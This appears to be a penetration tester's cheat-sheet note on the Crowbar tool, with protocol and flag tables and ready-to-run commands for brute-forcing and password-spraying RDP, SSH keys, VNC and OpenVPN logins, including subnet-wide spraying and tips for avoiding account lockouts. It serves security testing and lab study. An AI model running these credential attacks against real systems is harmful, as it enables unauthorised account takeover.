# Crowbar

**Tags:** `#crowbar` `#bruteforce` `#auth` `#rdp` `#ssh` `#vpn` `#passwordattack`

Brute-forcing tool built for protocols that Hydra and Medusa don't handle well — primarily RDP, SSH (key-based), VNC, and OpenVPN. Particularly useful for RDP brute force since most other tools struggle with NLA (Network Level Authentication).

**Source:** https://github.com/galkan/crowbar
**Install:** `apt install crowbar` or `git clone https://github.com/galkan/crowbar`

---

## Supported Protocols

| Protocol | Flag | Notes |
|---|---|---|
| RDP | `rdp` | Supports NLA — main reason to use crowbar over hydra |
| SSH | `sshkey` | SSH key-based auth brute force (try keys, not passwords) |
| VNC | `vnckey` | VNC key auth |
| OpenVPN | `openvpn` | `.ovpn` config file brute force |

---

## Core Flags

| Flag | Description |
|---|---|
| `-b` | Protocol (`rdp`, `sshkey`, `vnckey`, `openvpn`) |
| `-s` | Target IP or CIDR (`192.168.1.10/32` for single host) |
| `-u` | Single username |
| `-U` | Username list file |
| `-c` | Single password |
| `-C` | Password list file |
| `-k` | SSH/VNC key file or directory of keys |
| `-p` | Target port (if non-default) |
| `-t` | Threads (default 10) |
| `-o` | Output file |
| `-v` | Verbose |
| `-d` | Debug |
| `--config` | OpenVPN config file |

---

## Usage

### RDP Brute Force

```bash
# Single username, single password
crowbar -b rdp -s 192.168.1.10/32 -u administrator -c 'Password123'

# Username list, single password (password spray)
crowbar -b rdp -s 192.168.1.10/32 -U users.txt -c 'Password123'

# Single username, password list
crowbar -b rdp -s 192.168.1.10/32 -u administrator -C passwords.txt

# Subnet sweep — spray across a range
crowbar -b rdp -s 192.168.1.0/24 -U users.txt -c 'Password123'

# Custom port, verbose output, save results
crowbar -b rdp -s 192.168.1.10/32 -u administrator -C passwords.txt -p 3389 -v -o results.txt
```

### SSH Key Brute Force

```bash
# Try a single key against a user
crowbar -b sshkey -s 10.10.10.10/32 -u root -k /path/to/id_rsa

# Try all keys in a directory
crowbar -b sshkey -s 10.10.10.10/32 -u root -k /path/to/keys/

# Multiple users, key directory
crowbar -b sshkey -s 10.10.10.10/32 -U users.txt -k /path/to/keys/
```

### VNC Brute Force

```bash
# Single password
crowbar -b vnckey -s 10.10.10.10/32 -u root -c 'password'

# Password list
crowbar -b vnckey -s 10.10.10.10/32 -u root -C passwords.txt
```

### OpenVPN

```bash
# Brute force credentials against an OpenVPN endpoint
crowbar -b openvpn -s 10.10.10.10/32 -u vpnuser -C passwords.txt --config client.ovpn
```

---

## Tips

```bash
# Crowbar is slower than Hydra by design — more reliable for RDP
# Keep thread count low for RDP to avoid account lockouts
crowbar -b rdp -s 192.168.1.10/32 -U users.txt -c 'Password123' -t 1

# Output file shows successful creds clearly
# Format: 2024-01-01 12:00:00 RDP-SUCCESS host - username:password
cat results.txt | grep SUCCESS
```

> [!warning] Always check lockout policy before brute forcing RDP — even a short list can lock out accounts. Password spraying (one password across many users) is safer than per-account brute force.

> [!note] **Crowbar vs Hydra for RDP** — Hydra's RDP module is unreliable against NLA-enforced endpoints. Crowbar handles NLA correctly, making it the preferred tool for RDP brute force on modern Windows targets.
